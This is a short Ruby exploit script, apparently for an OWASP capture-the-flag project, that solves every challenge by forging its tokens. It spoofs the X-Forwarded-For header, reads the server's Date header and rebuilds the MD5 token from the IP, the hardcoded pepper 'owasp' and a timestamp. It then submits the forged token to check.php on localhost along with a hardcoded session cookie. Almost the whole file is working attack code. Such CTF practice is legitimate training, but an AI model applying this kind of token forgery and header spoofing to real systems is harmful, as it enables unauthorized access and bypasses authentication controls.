#!/usr/bin/ruby
#
# exploit poor token generation in the owasp ctf 
# project to solve all challenges
require 'date'
require 'digest'
require 'net/http'

pepper='owasp'

#Clear your PHPSESSID, then get a new one where you 
#haven't visited any challenge pages and put it here
session = 'jlio049e28km0uukb86al4kbj0'

#X-Forwarded-For is honored :P, and it becomes part 
#of the token hash
my_ip='72.65.67.74'

def trigger_token( url, session_cookie, ip )
  uri = URI.parse(url)
  http = Net::HTTP.new( uri.host, uri.port )
  req = Net::HTTP::Get.new(uri.request_uri)
  req['X-Forwarded-For'] = ip
  req['Cookie'] = 'PHPSESSID=' + session_cookie
  res = http.request( req ) 
  return DateTime.parse(res['Date']) 
end

def try( url, pepper, ip, time, session_cookie )
  #depending on time zone settings you might need to adjust this
  localtime = time.new_offset('-05:00')
  hash_string = ip + pepper + localtime.strftime("%Y%m%d%I%M%S")
  awesome_hash = Digest::MD5.hexdigest( hash_string ) 
  puts hash_string + '=' + awesome_hash
  uri = URI.parse(url + "?t=" + awesome_hash)
  http = Net::HTTP.new( uri.host, uri.port )
  req = Net::HTTP::Get.new(uri.request_uri)
  req['Cookie'] = 'PHPSESSID=' + session_cookie
  res = http.request( req )
  return res
end


#solve all owasp CTF challenges by guessing the "token"

challs = ('web/01'..'web/10').to_a + ('other/01'..'other/04').to_a
challs.each do |c|
  req_time = trigger_token("http://localhost/challenges/#{c}/",session, my_ip)
  try('http://localhost/check.php',pepper,my_ip,req_time,session)
end
    

